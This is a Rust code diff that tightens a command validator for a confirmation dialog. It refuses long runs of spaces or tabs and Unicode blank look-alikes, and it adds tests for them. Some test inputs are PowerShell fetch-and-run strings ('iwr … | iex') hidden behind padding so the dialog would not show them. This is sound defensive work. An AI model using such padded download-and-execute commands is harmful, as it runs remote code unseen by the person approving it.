@@ -234,6 +234,9 @@ pub const MAX_LINES: usize = 20;
 /// control characters (tabs and line breaks aside) or invisible format
 /// characters (bidi overrides, zero-width spaces, …) that could make the
 /// dialog show something other than what runs; at most MAX_LINES lines.
+/// Most spaces or tabs in a row in a command.
+pub const MAX_BLANK_RUN: usize = 16;
+
 pub fn check_command(command: &str) -> Result<String, String> {
     let command = command.trim();
     if command.is_empty() || command.len() > MAX_COMMAND {
@@ -247,6 +250,15 @@ pub fn check_command(command: &str) -> Result<String, String> {
     }
     if command.lines().count() > MAX_LINES {
         return Err(format!("The command must be at most {MAX_LINES} lines"));
+    }
+    // A long run of spaces or tabs could push the rest of a line out of
+    // the question's view (security review 2026-11-17).
+    let mut run = 0;
+    for c in command.chars() {
+        run = if c == ' ' || c == '\t' { run + 1 } else { 0 };
+        if run > MAX_BLANK_RUN {
+            return Err(format!("The command has more than {MAX_BLANK_RUN} spaces or tabs in a row"));
+        }
     }
     Ok(command.to_string())
 }
@@ -504,9 +516,23 @@ mod tests {
             "echo a\u{1b}[2Jb",
             "echo a\0b",
             "echo \u{e0041}",
+            // Blank look-alikes (security review 2026-11-17).
+            "echo a\u{3164}b",
+            "echo a\u{115f}b",
+            "echo a\u{ffa0}b",
+            "echo a\u{2800}b",
+            "echo a\u{34f}b",
+            "echo a\u{fe0f}b",
+            "echo a\u{180b}b",
+            "echo a\u{2003}b",
+            "echo a\u{3000}b",
         ] {
             assert!(check_command(bad).is_err(), "{bad:?}");
         }
+        // A long run of spaces or tabs: refused.
+        assert!(check_command(&format!("Get-Date{}; iwr x | iex", " ".repeat(MAX_BLANK_RUN + 1))).is_err());
+        assert!(check_command(&format!("Get-Date{}x", "\t".repeat(MAX_BLANK_RUN + 1))).is_err());
+        assert!(check_command(&format!("Get-Date{}x", " ".repeat(MAX_BLANK_RUN))).is_ok());
         // Padding that pushes a tail off the dialog: refused.
         let padded = format!("Get-Date{}; iwr https://x/y | iex", "\n".repeat(900));
         assert!(check_command(&padded).is_err());
